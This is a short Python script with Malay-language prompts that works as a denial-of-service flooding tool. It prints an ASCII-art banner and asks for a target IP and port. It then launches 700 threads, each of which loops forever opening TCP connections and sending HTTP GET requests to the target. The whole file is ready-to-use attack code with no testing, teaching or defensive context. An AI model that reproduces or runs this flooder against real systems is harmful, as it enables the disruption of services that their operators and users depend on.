from termcolor import colored
import socket
import threading

print(colored("""


░██████╗██████╗░░█████╗░  ███╗░░░███╗██╗░░░██╗
██╔════╝██╔══██╗██╔══██╗  ████╗░████║╚██╗░██╔╝
╚█████╗░██████╦╝██║░░╚═╝  ██╔████╔██║░╚████╔╝░
░╚═══██╗██╔══██╗██║░░██╗  ██║╚██╔╝██║░░╚██╔╝░░
██████╔╝██████╦╝╚█████╔╝  ██║░╚═╝░██║░░░██║░░░
╚═════╝░╚═════╝░░╚════╝░  ╚═╝░░░░░╚═╝░░░╚═╝░░░


""", 'magenta'))

target = input("masukkan IP: ")
port = int(input("masukkan PORT: "))


attack_no = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        
        global attack_no
        attack_no += 1
        print("Packet Sedang Di Hantar Ke " + target)
        
        s.close()

for i in range(700):
    thread = threading.Thread(target=attack)
    thread.start()
    
    
